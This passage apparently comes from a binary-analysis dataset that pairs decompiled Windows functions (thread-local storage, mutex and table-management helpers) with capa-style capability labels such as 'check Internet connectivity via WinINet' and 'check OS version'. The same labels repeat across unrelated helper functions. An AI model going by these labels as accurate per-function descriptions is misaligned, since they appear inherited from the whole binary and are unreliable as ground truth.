0x70)) {\n            if (iVar3 != 0) goto code_r0x00014000bb8d;\n            iVar11 = fcn.1400113f0();\n            iVar3 = *piVar6;\n            if (*(iVar11 + 0x70) == 0) goto code_r0x00014000bb98;\n            if (iVar3 != 0) goto code_r0x00014000be30;\n            iVar11 = fcn.1400113f0();\n            iVar3 = *piVar6;\n            iVar11 = (**(iVar11 + 0x70) - iVar4) * 0x10;\n            if (iVar3 != 0) goto code_r0x00014000bbad;\n            iVar12 = fcn.1400113f0();\n            iVar3 = *piVar6;\n            if (*(iVar12 + 0x68) != 0) {\n                if (iVar3 != 0) goto code_r0x00014000bbbc;\n                iVar12 = fcn.1400113f0();\n                iVar3 = *piVar6;\n                iVar12 = **(iVar12 + 0x68) + iVar4 * 0x10;\n                if (iVar3 != 0) {\n                    piVar5 = *(iVar3 + 0x68);\n                    goto code_r0x00014000bbcc;\n                }\n                iVar7 = fcn.1400113f0();\n                iVar3 = *piVar6;\n                if (*(iVar7 + 0x68) == 0) goto code_r0x00014000bbd4;\n                if (iVar3 != 0) goto code_r0x00014000be4e;\n                iVar3 = fcn.1400113f0();\n                piVar5 = *(iVar3 + 0x68);\n                goto code_r0x00014000bbdf;\n            }\n            goto code_r0x00014000be39;\n        }\n        iVar4 = iVar4 << 4;\ncode_r0x00014000bbf5:\n        if (iVar3 != 0) {\ncode_r0x00014000bbfe:\n            iVar11 = *(iVar3 + 0x80);\n            goto joined_r0x00014000bc06;\n        }\n        iVar11 = fcn.1400113f0();\n        iVar3 = *piVar6;\n        if (*(iVar11 + 0x80) == 0) goto code_r0x00014000baca;\n        if (iVar3 != 0) goto code_r0x00014000bc0c;\n        iVar11 = fcn.1400113f0();\n        iVar3 = *piVar6;\n        puVar9 = *(iVar11 + 0x80);\n        if (iVar3 != 0) goto code_r0x00014000bc13;\n        iVar11 = fcn.1400113f0();\n        iVar3 = *piVar6;\n        if (*(iVar11 + 0x68) == 0) goto code_r0x00014000bae3;\n        if (iVar3 != 0) goto code_r0x00014000bc1e;\n        iVar11 = fcn.1400113f0();\n        iVar3 = *piVar6;\n        *(**(iVar11 + 0x68) + 8 + iVar4) = *puVar9;\n        if (iVar3 != 0) goto code_r0x00014000bc2e;\n        iVar11 = fcn.1400113f0();\n        iVar3 = *piVar6;\n        if (*(iVar11 + 0x68) == 0) goto code_r0x00014000bda3;\n        if (iVar3 != 0) goto code_r0x00014000bc39;\n        iVar11 = fcn.1400113f0();\n        iVar3 = *piVar6;\n        *(**(iVar11 + 0x68) + iVar4) = arg1;\n        if (iVar3 != 0) goto code_r0x00014000bc44;\n        iVar4 = fcn.1400113f0();\n        iVar3 = *piVar6;\n        iVar4 = *(iVar4 + 0x70);\n    }\n    else {\n        if (*(iVar3 + 0x70) == 0) {\ncode_r0x00014000bb79:\n            *(iVar3 + 0x70) = 0x1400ee070;\n            iVar11 = *0x1400ee070;\n        }\n        else {\ncode_r0x00014000baab:\n            iVar11 = **(iVar3 + 0x70);\n        }\n        if (iVar4 != iVar11) {\ncode_r0x00014000bb8d:\n            if (*(iVar3 + 0x70) == 0) {\ncode_r0x00014000bb98:\n                piVar5 = 0x1400ee070;\n                *(iVar3 + 0x70) = 0x1400ee070;\n            }\n            else {\ncode_r0x00014000be30:\n                piVar5 = *(iVar3 + 0x70);\n            }\n            iVar11 = (*piVar5 - iVar4) * 0x10;\ncode_r0x00014000bbad:\n            if (*(iVar3 + 0x68) == 0) {\ncode_r0x00014000be39:\n                iVar12 = *0x1400ee078;\n                *(iVar3 + 0x68) = 0x1400ee078;\n                iVar12 = iVar12 + iVar4 * 0x10;\ncode_r0x00014000be4e:\n                piVar5 = *(iVar3 + 0x68);\n            }\n            else {\ncode_r0x00014000bbbc:\n                piVar5 = *(iVar3 + 0x68);\n                iVar12 = *piVar5 + iVar4 * 0x10;\ncode_r0x00014000bbcc:\n                if (piVar5 != NULL) goto code_r0x00014000be4e;\ncode_r0x00014000bbd4:\n                piVar5 = 0x1400ee078;\n                *(iVar3 + 0x68) = 0x1400ee078;\n            }\ncode_r0x00014000bbdf:\n            iVar4 = iVar4 * 0x10;\n            sub.msvcrt.dll_memmove(*piVar5 + 0x10 + iVar4, iVar12, iVar11);\n            iVar3 = *piVar6;\n            goto code_r0x00014000bbf5;\n        }\n        iVar4 = iVar4 << 4;\n        iVar11 = *(iVar3 + 0x80);\njoined_r0x00014000bc06:\n        if (iVar11 == 0) {\ncode_r0x00014000baca:\n            puVar9 = 0x1400ee060;\n            iVar11 = *(iVar3 + 0x68);\n            *(iVar3 + 0x80) = 0x1400ee060;\n        }\n        else {\ncode_r0x00014000bc0c:\n            puVar9 = *(iVar3 + 0x80);\ncode_r0x00014000bc13:\n            iVar11 = *(iVar3 + 0x68);\n        }\n        if (iVar11 == 0) {\ncode_r0x00014000bae3:\n            piVar5 = 0x1400ee078;\n            *(iVar3 + 0x68) = 0x1400ee078;\n        }\n        else {\ncode_r0x00014000bc1e:\n            piVar5 = *(iVar3 + 0x68);\n        }\n        *(*piVar5 + 8 + iVar4) = *puVar9;\ncode_r0x00014000bc2e:\n        if (*(iVar3 + 0x68) == 0) {\ncode_r0x00014000bda3:\n            piVar5 = 0x1400ee078;\n            *(iVar3 + 0x68) = 0x1400ee078;\n        }\n        else {\ncode_r0x00014000bc39:\n            piVar5 = *(iVar3 + 0x68);\n        }\n        *(*piVar5 + iVar4) = arg1;\ncode_r0x00014000bc44:\n        iVar4 = *(iVar3 + 0x70);\n    }\n    if (iVar4 == 0) {\n        piVar6 = 0x1400ee070;\n        *(iVar3 + 0x70) = 0x1400ee070;\ncode_r0x00014000bc61:\n        *piVar6 = *piVar6 + 1;\n    }\n    else {\n        if (iVar3 != 0) {\n            piVar6 = *(iVar3 + 0x70);\n            goto code_r0x00014000bc61;\n        }\n        iVar4 = fcn.1400113f0();\n        iVar3 = *piVar6;\n        **(iVar4 + 0x70) = **(iVar4 + 0x70) + 1;\n        if (iVar3 == 0) {\n            iVar4 = fcn.1400113f0();\n            iVar3 = *piVar6;\n            iVar4 = *(iVar4 + 0x80);\n            goto code_r0x00014000bc70;\n        }\n    }\n    iVar4 = *(iVar3 + 0x80);\ncode_r0x00014000bc70:\n    if (iVar4 == 0) {\n        puVar9 = 0x1400ee060;\n        *(iVar3 + 0x80) = 0x1400ee060;\n    }\n    else if (iVar3 == 0) {\n        iVar3 = fcn.1400113f0();\n        puVar9 = *(iVar3 + 0x80);\n    }\n    else {\n        puVar9 = *(iVar3 + 0x80);\n    }\n    return *puVar9;\n}\n",
        "token_count": 6687
    },
    "14000c22": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.14000c220(void)\n\n{\n    int64_t **ppiVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    ulong *puVar7;\n    \n    piVar2 = *0x1400d7110;\n    iVar4 = **0x1400d7110;\n    if (iVar4 == 0) {\n        iVar5 = fcn.1400113f0();\n        iVar4 = *piVar2;\n        if (*(iVar5 + 0x60) == 0) goto code_r0x00014000c247;\n        if (iVar4 == 0) {\n            iVar4 = fcn.1400113f0();\n        }\ncode_r0x00014000c380:\n        uVar6 = *(iVar4 + 0x60);\n    }\n    else {\n        if (*(iVar4 + 0x60) != 0) goto code_r0x00014000c380;\ncode_r0x00014000c247:\n        uVar6 = 0x14001b0b8;\n        *(iVar4 + 0x60) = 0x14001b0b8;\n    }\n    fcn.140011a20(uVar6);\n    iVar4 = *piVar2;\n    if (iVar4 == 0) {\n        iVar5 = fcn.1400113f0();\n        iVar4 = *piVar2;\n        if (*(iVar5 + 0x50) == 0) goto code_r0x00014000c26a;\n        if (iVar4 == 0) {\n            iVar4 = fcn.1400113f0();\n        }\ncode_r0x00014000c2f0:\n        iVar4 = **(iVar4 + 0x50);\n        if (iVar4 != 0) goto code_r0x00014000c280;\ncode_r0x00014000c2fc:\n        iVar5 = sub.msvcrt.dll_calloc(1, 0x1e0);\n        if (iVar5 != 0) {\n            iVar3 = fcn.14000b740(iVar5);\n            if (iVar3 == 0) {\n                sub.msvcrt.dll_free(iVar5);\n            }\n            else {\n                *(iVar5 + 0x1d8) = iVar3;\n                iVar4 = iVar5;\n            }\n        }\n        iVar5 = *piVar2;\n        if (iVar5 != 0) {\n            if (*(iVar5 + 0x60) != 0) goto code_r0x00014000c345;\n            goto code_r0x00014000c470;\n        }\n        iVar3 = fcn.1400113f0();\n        iVar5 = *piVar2;\n        if (*(iVar3 + 0x60) == 0) goto code_r0x00014000c470;\ncode_r0x00014000c345:\n        if (iVar5 != 0) goto code_r0x00014000c2b3;\ncode_r0x00014000c350:\n        iVar5 = fcn.1400113f0();\n    }\n    else {\n        if (*(iVar4 + 0x50) != 0) goto code_r0x00014000c2f0;\ncode_r0x00014000c26a:\n        *(iVar4 + 0x50) = 0x1400ee088;\n        iVar4 = *0x1400ee088;\n        if (*0x1400ee088 == 0) goto code_r0x00014000c2fc;\ncode_r0x00014000c280:\n        iVar3 = fcn.14000b740(iVar4);\n        *(iVar4 + 0x1d8) = iVar3;\n        iVar5 = *piVar2;\n        if (iVar3 == 0) {\n            iVar4 = 0;\n            if (iVar5 == 0) goto code_r0x00014000c3cc;\ncode_r0x00014000c2a8:\n            if (*(iVar5 + 0x60) == 0) goto code_r0x00014000c470;\n        }\n        else {\n            if (iVar5 == 0) {\n                iVar3 = fcn.1400113f0();\n                iVar5 = *piVar2;\n                if (*(iVar3 + 0x50) != 0) {\n                    if (iVar5 == 0) {\n                        iVar5 = fcn.1400113f0();\n                    }\n                    goto code_r0x00014000c39c;\n                }\ncode_r0x00014000c408:\n                *(iVar5 + 0x50) = 0x1400ee088;\n                *0x1400ee088 = *(iVar4 + 0x1d0);\n                if (*0x1400ee088 != 0) goto code_r0x00014000c3b7;\ncode_r0x00014000c427:\n                if (*(iVar5 + 0x58) == 0) {\ncode_r0x00014000c4b0:\n                    puVar7 = 0x1400ee080;\n                    *(iVar5 + 0x58) = 0x1400ee080;\n                }\n                else {\ncode_r0x00014000c432:\n                    puVar7 = *(iVar5 + 0x58);\n                }\ncode_r0x00014000c436:\n                *puVar7 = 0;\n                *(iVar4 + 0x1d0) = 0;\n            }\n            else {\n                if (*(iVar5 + 0x50) == 0) goto code_r0x00014000c408;\ncode_r0x00014000c39c:\n                ppiVar1 = iVar5 + 0x50;\n                iVar3 = *(iVar4 + 0x1d0);\n                iVar5 = *piVar2;\n                **ppiVar1 = iVar3;\n                if (iVar3 == 0) {\n                    if (iVar5 != 0) goto code_r0x00014000c427;\n                    iVar3 = fcn.1400113f0();\n                    iVar5 = *piVar2;\n                    if (*(iVar3 + 0x58) == 0) goto code_r0x00014000c4b0;\n                    if (iVar5 != 0) goto code_r0x00014000c432;\n                    iVar5 = fcn.1400113f0();\n                    puVar7 = *(iVar5 + 0x58);\n                    iVar5 = *piVar2;\n                    goto code_r0x00014000c436;\n                }\ncode_r0x00014000c3b7:\n                *(iVar4 + 0x1d0) = 0;\n            }\n            if (iVar5 != 0) goto code_r0x00014000c2a8;\ncode_r0x00014000c3cc:\n            iVar3 = fcn.1400113f0();\n            iVar5 = *piVar2;\n            if (*(iVar3 + 0x60) == 0) {\ncode_r0x00014000c470:\n                uVar6 = 0x14001b0b8;\n                *(iVar5 + 0x60) = 0x14001b0b8;\n                goto code_r0x00014000c2b7;\n            }\n            if (iVar5 == 0) goto code_r0x00014000c350;\n        }\n    }\ncode_r0x00014000c2b3:\n    uVar6 = *(iVar5 + 0x60);\ncode_r0x00014000c2b7:\n    fcn.140011d40(uVar6);\n    return iVar4;\n}\n",
        "token_count": 1715
    },
    "14000c4f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14000c4f0(void)\n\n{\n    int64_t *piVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint *puVar6;\n    \n    piVar1 = *0x1400d7110;\n    iVar5 = **0x1400d7110;\n    if (iVar5 == 0) {\n        iVar4 = fcn.1400113f0();\n        iVar5 = *piVar1;\n        if (*(iVar4 + 0x30) != 0) {\n            if (iVar5 == 0) {\n                iVar5 = fcn.1400113f0();\n            }\n            goto code_r0x00014000c5a0;\n        }\ncode_r0x00014000c510:\n        puVar6 = 0x14001b0c8;\n        *(iVar5 + 0x30) = 0x14001b0c8;\n    }\n    else {\n        if (*(iVar5 + 0x30) == 0) goto code_r0x00014000c510;\ncode_r0x00014000c5a0:\n        puVar6 = *(iVar5 + 0x30);\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_TlsAlloc)();\n    *puVar6 = uVar2;\n    iVar5 = *piVar1;\n    if (iVar5 == 0) {\n        iVar4 = fcn.1400113f0();\n        iVar5 = *piVar1;\n        if (*(iVar4 + 0x30) != 0) {\n            if (iVar5 == 0) {\n                iVar5 = fcn.1400113f0();\n            }\n            goto code_r0x00014000c570;\n        }\n    }\n    else if (*(iVar5 + 0x30) != 0) {\ncode_r0x00014000c570:\n        piVar3 = *(iVar5 + 0x30);\n        goto code_r0x00014000c540;\n    }\n    *(iVar5 + 0x30) = 0x14001b0c8;\n    piVar3 = 0x14001b0c8;\ncode_r0x00014000c540:\n    if (*piVar3 != -1) {\n        return;\n    }\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 554
    },
    "14000c5b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.14000c5b0(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    ulong uStack120;\n    ulong uStack112;\n    ulong uStack104;\n    ulong uStack96;\n    ulong uStack88;\n    ulong uStack80;\n    ulong uStack72;\n    ulong uStack64;\n    ulong uStack56;\n    ulong uStack48;\n    ulong uStack40;\n    ulong uStack32;\n    ulong uStack24;\n    ushort uStack16;\n    uchar uStack14;\n    \n    uStack120 = 0x6c6320726f727245;\n    uStack112 = 0x7520676e696e6165;\n    uStack104 = 0x6b5f6e6970732070;\n    uStack96 = 0x20726f6620737965;\n    uStack88 = 0x20646165726874;\n    uStack80 = 0;\n    uStack72 = 0;\n    uStack64 = 0;\n    uStack56 = 0;\n    uStack48 = 0;\n    uStack40 = 0;\n    uStack32 = 0;\n    uStack24 = 0;\n    uStack16 = 0;\n    uStack14 = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    (*_sym.imp.msvcrt.dll__ultoa)(uVar1, &uStack88 + 7, 10);\n    if (uStack88._7_1_ == '\\0') goto code_r0x00014000c6c2;\n    iVar3 = 0x28;\n    while( true ) {\n        iVar2 = iVar3;\n        iVar4 = iVar2;\n        if (*(&uStack120 + iVar3) == '\\0') break;\n        iVar3 = iVar3 + 1;\n        if (iVar3 == 0x6b) goto code_r0x00014000c6b7;\n    }\n    if (iVar2 == 0x6a) goto code_r0x00014000c6b7;\n    iVar2 = iVar2 + 1;\n    do {\n        *(&uStack120 + iVar4) = 10;\n        *(&uStack120 + iVar2) = 0;\ncode_r0x00014000c6b7:\n        (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(&uStack120);\n        sub.msvcrt.dll_abort();\ncode_r0x00014000c6c2:\n        iVar2 = 0x28;\n        iVar4 = 0x27;\n    } while( true );\n}\n",
        "token_count": 603
    },
    "14000c6e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.14000c6e0(int32_t *arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    ulong uVar8;\n    ulong *puVar9;\n    \n    iVar7 = fcn.14000b290(arg1);\n    fcn.140011a20(iVar7 + 8);\n    iVar2 = *arg1;\n    if (iVar2 == 0) {\n        fcn.14000c4f0();\n        *arg1 = 1;\n    }\n    else if (iVar2 != 1) {\n        uVar8 = (**0x14001b130)(2);\n        sub.msvcrt.dll_fprintf(uVar8, \" once %p is %d\\n\", arg1, iVar2);\n    }\n    uVar8 = fcn.140011d40(iVar7 + 8);\n    piVar3 = *0x1400d7110;\n    if (iVar7 == 0) {\n        return uVar8;\n    }\n    iVar5 = **0x1400d7110;\n    if (iVar5 == 0) {\n        iVar6 = fcn.1400113f0();\n        iVar5 = *piVar3;\n        if (*(iVar6 + 0x90) == 0) goto code_r0x00014000b4d5;\n        if (iVar5 == 0) {\n            iVar5 = fcn.1400113f0();\n        }\ncode_r0x00014000b5b0:\n        fcn.1400132a0(*(iVar5 + 0x90));\n        iVar5 = *piVar3;\n        if (iVar5 != 0) goto code_r0x00014000b4f4;\ncode_r0x00014000b5c8:\n        iVar6 = fcn.1400113f0();\n        iVar5 = *piVar3;\n        if (*(iVar6 + 0x88) != 0) {\n            if (iVar5 == 0) {\n                iVar5 = fcn.1400113f0();\n            }\n            goto code_r0x00014000b502;\n        }\ncode_r0x00014000b5f0:\n        *(iVar5 + 0x88) = 0x1400ee058;\n        piVar4 = 0x1400ee058;\n    }\n    else {\n        if (*(iVar5 + 0x90) != 0) goto code_r0x00014000b5b0;\ncode_r0x00014000b4d5:\n        *(iVar5 + 0x90) = 0x14001b0b0;\n        fcn.1400132a0(0x14001b0b0);\n        iVar5 = *piVar3;\n        if (iVar5 == 0) goto code_r0x00014000b5c8;\ncode_r0x00014000b4f4:\n        if (*(iVar5 + 0x88) == 0) goto code_r0x00014000b5f0;\ncode_r0x00014000b502:\n        piVar4 = *(iVar5 + 0x88);\n    }\n    iVar5 = *piVar4;\n    if ((iVar7 == iVar5) || (iVar5 == 0)) {\n        iVar6 = 0;\n    }\n    else {\n        do {\n            iVar6 = iVar5;\n            iVar5 = *(iVar6 + 0x18);\n            if (iVar5 == 0) goto code_r0x00014000b6b0;\n        } while (iVar7 != iVar5);\n    }\n    if (iVar5 == 0) {\ncode_r0x00014000b6b0:\n        uVar8 = (**0x14001b130)(2);\n        sub.msvcrt.dll_fprintf(uVar8, \"%p not found?!?!\\n\", iVar7);\n        goto code_r0x00014000b54a;\n    }\n    piVar1 = iVar7 + 0x10;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 != 0) goto code_r0x00014000b54a;\n    fcn.140011f10(iVar7 + 8);\n    if (iVar6 == 0) {\n        iVar5 = *piVar3;\n        if (iVar5 == 0) {\n            iVar6 = fcn.1400113f0();\n            iVar5 = *piVar3;\n            if (*(iVar6 + 0x88) == 0) goto code_r0x00014000b683;\n            if (iVar5 == 0) {\n                iVar5 = fcn.1400113f0();\n            }\ncode_r0x00014000b708:\n            puVar9 = *(iVar5 + 0x88);\n        }\n        else {\n            if (*(iVar5 + 0x88) != 0) goto code_r0x00014000b708;\ncode_r0x00014000b683:\n            *(iVar5 + 0x88) = 0x1400ee058;\n            puVar9 = 0x1400ee058;\n        }\n        *puVar9 = *(iVar7 + 0x18);\n    }\n    else {\n        *(iVar6 + 0x18) = *(iVar7 + 0x18);\n    }\n    sub.msvcrt.dll_free(iVar7);\ncode_r0x00014000b54a:\n    iVar7 = *piVar3;\n    if (iVar7 == 0) {\n        iVar5 = fcn.1400113f0();\n        iVar7 = *piVar3;\n        iVar5 = *(iVar5 + 0x90);\n    }\n    else {\n        iVar5 = *(iVar7 + 0x90);\n    }\n    if (iVar5 == 0) {\n        puVar9 = 0x14001b0b0;\n        *(iVar7 + 0x90) = 0x14001b0b0;\n    }\n    else {\n        if (iVar7 == 0) {\n            iVar7 = fcn.1400113f0();\n        }\n        puVar9 = *(iVar7 + 0x90);\n    }\n    *puVar9 = 0xffffffffffffffff;\n    return 0;\n}\n",
        "token_count": 1420
    },
    "14000c76": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool fcn.14000c760(ulong *arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int32_t *arg2;\n    ulong arg1_00;\n    uint64_t uVar7;\n    int32_t **arg1_01;\n    int64_t *piVar8;\n    ulong *puVar9;\n    ulong *puVar10;\n    uint64_t uVar11;\n    int64_t iVar12;\n    uint64_t uVar13;\n    int64_t iVar14;\n    uint64_t uVar15;\n    bool bVar16;\n    \n    piVar1 = *0x1400d7110;\n    iVar6 = **0x1400d7110;\n    if (iVar6 == 0) {\n        iVar4 = fcn.1400113f0();\n        iVar6 = *piVar1;\n        if (*(iVar4 + 0x60) == 0) goto code_r0x00014000c792;\n        if (iVar6 == 0) {\n            iVar6 = fcn.1400113f0();\n        }\ncode_r0x00014000c8d0:\n        arg1_00 = *(iVar6 + 0x60);\n    }\n    else {\n        if (*(iVar6 + 0x60) != 0) goto code_r0x00014000c8d0;\ncode_r0x00014000c792:\n        arg1_00 = 0x14001b0b8;\n        *(iVar6 + 0x60) = 0x14001b0b8;\n    }\n    fcn.140011a20(arg1_00);\n    uVar7 = arg1[0x3b];\n    if (uVar7 != 0) {\n        iVar6 = *piVar1;\n        if (iVar6 == 0) {\n            iVar4 = fcn.1400113f0();\n            iVar6 = *piVar1;\n            if (*(iVar4 + 0x70) == 0) goto code_r0x00014000c998;\n            if (iVar6 != 0) goto code_r0x00014000ca58;\n            iVar6 = fcn.1400113f0();\n            if (**(iVar6 + 0x70) == 0) goto code_r0x00014000c7b2;\n            iVar6 = *piVar1;\n            if (iVar6 != 0) goto code_r0x00014000c9b4;\n            iVar4 = fcn.1400113f0();\n            iVar6 = *piVar1;\n            if (*(iVar4 + 0x70) == 0) goto code_r0x00014000cbb0;\n            if (iVar6 == 0) {\n                iVar6 = fcn.1400113f0();\n                piVar8 = *(iVar6 + 0x70);\n                iVar6 = *piVar1;\n                goto code_r0x00014000c9c3;\n            }\n        }\n        else {\n            if (*(iVar6 + 0x70) == 0) {\ncode_r0x00014000c998:\n                *(iVar6 + 0x70) = 0x1400ee070;\n                piVar8 = 0x1400ee070;\n            }\n            else {\ncode_r0x00014000ca58:\n                piVar8 = *(iVar6 + 0x70);\n            }\n            if (*piVar8 == 0) goto code_r0x00014000c7b2;\n            iVar6 = *piVar1;\ncode_r0x00014000c9b4:\n            if (*(iVar6 + 0x70) == 0) {\ncode_r0x00014000cbb0:\n                piVar8 = 0x1400ee070;\n                *(iVar6 + 0x70) = 0x1400ee070;\n                goto code_r0x00014000c9c3;\n            }\n        }\n        piVar8 = *(iVar6 + 0x70);\ncode_r0x00014000c9c3:\n        uVar13 = 0;\n        uVar15 = *piVar8 - 1;\n        do {\n            uVar11 = uVar13 + uVar15 >> 1;\n            if (iVar6 == 0) {\n                iVar4 = fcn.1400113f0();\n                iVar6 = *piVar1;\n                if (*(iVar4 + 0x68) != 0) {\n                    if (iVar6 == 0) {\n                        iVar6 = fcn.1400113f0();\n                    }\n                    goto code_r0x00014000ca11;\n                }\ncode_r0x00014000ca78:\n                *(iVar6 + 0x68) = 0x1400ee078;\n                piVar8 = 0x1400ee078;\n            }\n            else {\n                if (*(iVar6 + 0x68) == 0) goto code_r0x00014000ca78;\ncode_r0x00014000ca11:\n                piVar8 = *(iVar6 + 0x68);\n                iVar6 = *piVar1;\n            }\n            if (uVar7 == *(*piVar8 + 8 + uVar11 * 0x10)) {\n                if (iVar6 == 0) {\n                    iVar6 = fcn.1400113f0();\n                    if (*(iVar6 + 0x68) == 0) {\n                        iVar6 = *piVar1;\n                        goto code_r0x00014000cbd4;\n                    }\ncode_r0x00014000cc98:\n                    iVar6 = *piVar1;\n                    if (iVar6 != 0) goto code_r0x00014000cbe3;\n                    fcn.1400113f0();\n                    iVar6 = *piVar1;\n                    uVar7 = uVar11 + 1;\n                    if (iVar6 != 0) goto code_r0x00014000cbe3;\n                    iVar4 = fcn.1400113f0();\n                    iVar6 = *piVar1;\n                    if (*(iVar4 + 0x70) == 0) goto code_r0x00014000cbee;\n                    if (iVar6 != 0) goto code_r0x00014000ceb0;\n                    iVar4 = fcn.1400113f0();\n                    iVar6 = *piVar1;\n                    if (uVar7 <= **(iVar4 + 0x70) && **(iVar4 + 0x70) != uVar7) {\n                        iVar4 = uVar7 * 0x10;\n                        if (iVar6 != 0) goto code_r0x00014000cebd;\n                        iVar12 = fcn.1400113f0();\n                        iVar6 = *piVar1;\n                        if (*(iVar12 + 0x70) == 0) goto code_r0x00014000cec4;\n                        if (iVar6 != 0) goto code_r0x00014000cf32;\n                        iVar12 = fcn.1400113f0();\n                        iVar6 = *piVar1;\n                        iVar12 = (**(iVar12 + 0x70) - uVar7) * 0x10;\n                        if (iVar6 != 0) goto code_r0x00014000ced9;\n                        iVar14 = fcn.1400113f0();\n                        iVar6 = *piVar1;\n                        if (*(iVar14 + 0x68) == 0) goto code_r0x00014000cfb8;\n                        if (iVar6 != 0) goto code_r0x00014000cee4;\n                        iVar14 = fcn.1400113f0();\n                        iVar6 = *piVar1;\n                        iVar14 = **(iVar14 + 0x68) + iVar4;\n                        if (iVar6 == 0) {\n                            iVar5 = fcn.1400113f0();\n                            iVar6 = *piVar1;\n                            if (*(iVar5 + 0x68) == 0) goto code_r0x00014000d009;\n                            if (iVar6 == 0) {\n                                iVar6 = fcn.1400113f0();\n                            }\n                            goto code_r0x00014000cef5;\n                        }\n                        if (*(iVar6 + 0x68) != 0) goto code_r0x00014000cef5;\ncode_r0x00014000d009:\n                        *(iVar6 + 0x68) = 0x1400ee078;\n                        piVar8 = 0x1400ee078;\n                        goto code_r0x00014000cef9;\n                    }\ncode_r0x00014000cf10:\n                    if (iVar6 != 0) goto code_r0x00014000cc06;\n                    iVar6 = fcn.1400113f0();\n                    if (*(iVar6 + 0x70) != 0) goto code_r0x00014000cda0;\n                    iVar6 = *piVar1;\ncode_r0x00014000cc11:\n                    piVar8 = 0x1400ee070;\n                    *(iVar6 + 0x70) = 0x1400ee070;\ncode_r0x00014000cc1c:\n                    *piVar8 = *piVar8 + -1;\ncode_r0x00014000cc20:\n                    if (*(iVar6 + 0x70) == 0) {\ncode_r0x00014000cc2b:\n                        piVar8 = 0x1400ee070;\n                        *(iVar6 + 0x70) = 0x1400ee070;\n                    }\n                    else {\ncode_r0x00014000cea0:\n                        piVar8 = *(iVar6 + 0x70);\n                    }\n                    if (*piVar8 != 0) break;\ncode_r0x00014000cc40:\n                    if (*(iVar6 + 0x68) == 0) goto code_r0x00014000cfeb;\ncode_r0x00014000cc4b:\n                    puVar9 = *(iVar6 + 0x68);\n                }\n                else {\n                    if (*(iVar6 + 0x68) != 0) goto code_r0x00014000cc98;\ncode_r0x00014000cbd4:\n                    *(iVar6 + 0x68) = 0x1400ee078;\ncode_r0x00014000cbe3:\n                    if (*(iVar6 + 0x70) == 0) {\ncode_r0x00014000cbee:\n                        uVar7 = *0x1400ee070;\n                        *(iVar6 + 0x70) = 0x1400ee070;\n                        if (uVar11 + 1 < uVar7) {\ncode_r0x00014000cf32:\n                            piVar8 = *(iVar6 + 0x70);\n                            goto code_r0x00014000cecf;\n                        }\n                    }\n                    else {\ncode_r0x00014000ceb0:\n                        if (uVar11 + 1 < **(iVar6 + 0x70)) {\ncode_r0x00014000cebd:\n                            if (*(iVar6 + 0x70) != 0) goto code_r0x00014000cf32;\ncode_r0x00014000cec4:\n                            piVar8 = 0x1400ee070;\n                            *(iVar6 + 0x70) = 0x1400ee070;\ncode_r0x00014000cecf:\n                            iVar12 = (*piVar8 - (uVar11 + 1)) * 0x10;\ncode_r0x00014000ced9:\n                            if (*(iVar6 + 0x68) == 0) {\ncode_r0x00014000cfb8:\n                                piVar8 = 0x1400ee078;\n                                *(iVar6 + 0x68) = 0x1400ee078;\n                            }\n                            else {\ncode_r0x00014000cee4:\n                                piVar8 = *(iVar6 + 0x68);\n                            }\n                            iVar4 = (uVar11 + 1) * 0x10;\n                            iVar14 = *piVar8 + iVar4;\ncode_r0x00014000cef5:\n                            piVar8 = *(iVar6 + 0x68);\ncode_r0x00014000cef9:\n                            sub.msvcrt.dll_memmove(*piVar8 + -0x10 + iVar4, iVar14, iVar12);\n                            iVar6 = *piVar1;\n                            goto code_r0x00014000cf10;\n                        }\n                    }\ncode_r0x00014000cc06:\n                    if (*(iVar6 + 0x70) == 0) goto code_r0x00014000cc11;\ncode_r0x00014000cda0:\n                    iVar6 = *piVar1;\n                    if (iVar6 != 0) {\n                        piVar8 = *(iVar6 + 0x70);\n                    